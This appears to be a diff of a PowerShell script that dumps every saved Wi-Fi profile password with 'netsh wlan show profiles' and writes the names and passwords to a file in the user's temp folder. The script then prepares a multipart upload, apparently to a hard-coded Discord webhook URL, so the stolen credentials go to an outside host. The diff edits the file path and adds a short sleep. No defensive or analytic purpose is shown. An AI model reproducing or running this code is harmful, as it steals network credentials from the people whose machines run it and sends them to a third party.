@@ -1,4 +1,4 @@
-$n = "$env:UserName.txt"
+$n = "$env:TEMP\$env:UserName.txt"
 $w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'
 
 (netsh wlan show profiles) |
@@ -12,6 +12,8 @@ $w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlH
         [PSCustomObject]@{PROFILE_NAME = $p; PASSWORD = $k}
       }
   } | Out-File $n
+
+Start-Sleep -Milliseconds 500
 
 $boundary = [System.Guid]::NewGuid().ToString()
 $LF = "`r`n"
